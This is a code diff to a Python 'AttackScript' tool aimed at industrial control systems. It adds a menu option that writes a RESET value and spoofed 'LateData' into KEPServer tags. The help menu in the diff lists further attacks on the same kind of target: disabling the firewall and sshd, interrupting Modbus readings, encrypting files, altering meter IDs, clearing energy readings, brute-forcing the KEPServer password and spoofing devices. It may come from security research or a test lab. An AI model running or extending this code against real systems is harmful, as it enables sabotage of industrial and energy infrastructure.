@@ -1183,6 +1183,18 @@ class AttackScript:
         print(results)
         return results
 
+    def write_to_tags(self):
+        server = self.kep_connect()
+        # Write to RESET tag
+        reset_tag = 'RESET'
+        reset_value = 1
+        server.write_tag(reset_tag, reset_value)
+
+        # Write to LateData tag
+        latedata_tag = 'LateData'
+        latedata_value = 'Sample Data'
+        server.write_tag(latedata_tag, latedata_value)
+
     def connect_to_wifi(self, ssid="HF2211A_ACSL_RPT", profile_name="HF2211A_ACSL_RPT", interface="Wi-Fi"):
         try:
             # Prepare the command to connect to the Wi-Fi network
@@ -1231,6 +1243,7 @@ class AttackScript:
             case "23": self.kep_get_single_device()
             case "24": self.kep_delete_spoofed_device()
             case "25": self.kep_add_spoofed_device()
+            case "26": self.write_to_tags()
             case "-h":
                 print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info.")
             case _: print("Invalid Option! Use option \"-h\" for help!")
